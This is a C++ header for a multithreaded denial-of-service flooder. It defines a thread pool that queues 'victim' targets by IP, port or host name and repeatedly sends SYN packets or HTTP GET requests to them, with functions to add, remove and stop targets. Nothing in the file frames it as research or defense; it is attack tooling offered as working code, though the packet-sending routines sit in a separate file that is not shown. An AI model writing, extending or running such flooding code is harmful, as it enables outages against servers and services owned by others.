#ifndef EXAMPLE_SYN_THREAD_POOL_H
#define EXAMPLE_SYN_THREAD_POOL_H

#include <condition_variable>
#include <queue>
#include <future>
#include <unordered_map>
#include "tbb/concurrent_unordered_set.h"
#include "packet_sending.h"

#define SYN_FLOOD 1
#define HTTP_FLOOD 2

struct src_dst
{
    int source_ip;
    int source_port;
    int dest_ip;
    int dest_port;
    int flood_type;
    const char* host_name;
    int status;
};

class thread_pool
{
public:

    explicit thread_pool(int threads)
    {
        start(threads);
    }

    ~thread_pool()
    {
        stop();
    }


    void enqueue(src_dst ports_ips)
    {
        {
            std::unique_lock<std::mutex> lock{event_mutex};

            size_t target = 0;
            size_t min_size = tasks_per_thread[target].size();
            for (int i = 0; i < tasks_per_thread.size(); i++)
            {
                size_t cur_size = tasks_per_thread[i].size();
                if (cur_size < min_size)
                {
                    min_size = cur_size;
                    target = i;
                }
            }
            tasks_per_thread[target].push_back(ports_ips);
        }
        event_char_m.notify_one();
    }

    void insert_pill(int thread_num)
    {
        {
            std::unique_lock<std::mutex> lock{event_mutex};
            src_dst poison{};
            poison.source_port = 0;
            tasks_per_thread[thread_num].push_back(poison);
        }
    }

    void remove_victim(src_dst ips_ports_to_remove)
    {
        {
            std::unique_lock<std::mutex> lock{event_mutex};
	    int found = 0;
	    for (int i = 0; i < tasks_per_thread.size(); i++)
	    {
		    for (int j = 0; j < tasks_per_thread[i].size(); j++)
		    {
			    if ((ips_ports_to_remove.dest_port == tasks_per_thread[i][j].dest_port
				 && ips_ports_to_remove.dest_ip == tasks_per_thread[i][j].dest_ip)
				|| ips_ports_to_remove.host_name == tasks_per_thread[i][j].host_name)
			    {
//				    tasks_per_thread[i].erase(tasks_per_thread[i].cbegin()+j);
				    tasks_per_thread[i][j].status = 1;
				    found = 1;
				    break;
			    }
		    }
		    if (found) break;
	    }
        }
    }

private:
    std::vector<std::thread> threads_m;
    std::condition_variable event_char_m;
    std::mutex event_mutex;
    bool stop_m = false;
    std::unordered_map<size_t, std::vector<src_dst>> tasks_per_thread;

    void start(int threads)
    {
        for (auto i = 0; i < threads; i++)
        {
            threads_m.emplace_back([=] {
                while(true)
		{
			int stop = 0;
			{
				std::unique_lock<std::mutex> lock{event_mutex};
				for (int j = 0; j < tasks_per_thread[i].size(); j++)
				{
					src_dst ips_ports{};
					event_char_m.wait(lock, [=] { return stop_m || !tasks_per_thread[i].empty(); });
					if (stop_m || tasks_per_thread[i].empty()) {
						stop = 1;
						break;
					}

					ips_ports = tasks_per_thread[i][j];
					if (ips_ports.source_port == 0) {
						stop = 1;
						tasks_per_thread[i].clear();
						break;
					}
					if (ips_ports.flood_type == SYN_FLOOD) {
						packet_sending::send_tcp(ips_ports.source_ip, ips_ports.source_port,
									 ips_ports.dest_ip, ips_ports.dest_port);
					} else if (ips_ports.flood_type == HTTP_FLOOD) {
						packet_sending::send_get_request(ips_ports.host_name);
					}
				}
			}
			if (stop) break;
		}
            });
        }
    }

    void stop() noexcept
    {
        {
            std::unique_lock<std::mutex> lock{event_mutex};
            stop_m = true;
        }
        event_char_m.notify_all();
        for (auto& thread: threads_m)
        {
            thread.join();
        }
        threads_m.clear();
    }
};

#endif //EXAMPLE_SYN_THREAD_POOL_H